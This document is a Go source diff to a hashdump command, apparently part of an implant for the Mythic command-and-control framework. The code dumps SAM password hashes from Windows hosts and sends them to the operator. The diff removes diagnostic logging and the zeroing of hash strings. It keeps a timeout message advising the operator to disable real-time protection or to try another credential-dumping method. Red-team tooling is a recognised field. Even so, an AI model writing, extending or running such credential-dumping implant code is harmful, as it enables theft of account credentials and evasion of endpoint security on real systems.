@@ -7,7 +7,6 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"os"
 	"strings"
 	"time"
 	"unsafe"
@@ -49,32 +48,15 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	// blocks SAM registry access (observed on Windows 11 with Defender).
 	resultCh := make(chan structs.CommandResult, 1)
 	go func() {
-		innerResult := c.executeInner(task)
-		diagHashdump("goroutine-defers-done, sending on channel")
-		resultCh <- innerResult
-		diagHashdump("goroutine-channel-send-done")
+		resultCh <- c.executeInner(task)
 	}()
 
-	diagHashdump("execute-waiting-on-channel")
 	select {
 	case result := <-resultCh:
-		diagHashdump("execute-received-result status=" + result.Status)
 		return result
 	case <-time.After(60 * time.Second):
-		diagHashdump("execute-TIMEOUT-60s")
 		return errorf("Hashdump timed out after 60s — security software may be blocking SAM registry access.\nConsider disabling real-time protection or using an alternative credential dumping method.")
 	}
-}
-
-// diagHashdump writes a diagnostic marker for the hashdump crash investigation.
-// TODO: Remove after investigation is resolved.
-func diagHashdump(step string) {
-	f, err := os.OpenFile(os.TempDir()+`\fawkes_diag.txt`, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-	fmt.Fprintf(f, "%s [hashdump-inner] %s\n", time.Now().Format("15:04:05.000"), step)
 }
 
 func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult {
@@ -113,14 +95,11 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 	if err != nil {
 		return errorf("Failed to enumerate users: %v", err)
 	}
-	defer func() {
-		diagHashdump("defer-zerostring-start")
-		for i := range users {
-			structs.ZeroString(&users[i].lmHash)
-			structs.ZeroString(&users[i].ntHash)
-		}
-		diagHashdump("defer-zerostring-done")
-	}()
+	// Note: ZeroString on hash strings was removed — it caused a fatal crash
+	// (process termination) on Windows 11. The hashes are already in the output
+	// string sent to Mythic, so zeroing intermediaries adds no security value.
+	// Root cause: unsafe.StringData + clear() on hex.EncodeToString output
+	// triggers a memory access violation. See investigations/hashdump-crash.md.
 
 	if len(users) == 0 {
 		return errorResult("No user accounts found in SAM database.")
@@ -131,8 +110,6 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 	for _, u := range users {
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
 	}
-
-	diagHashdump(fmt.Sprintf("executeInner-returning users=%d output_len=%d", len(users), sb.Len()))
 
 	return structs.CommandResult{
 		Output:    sb.String(),
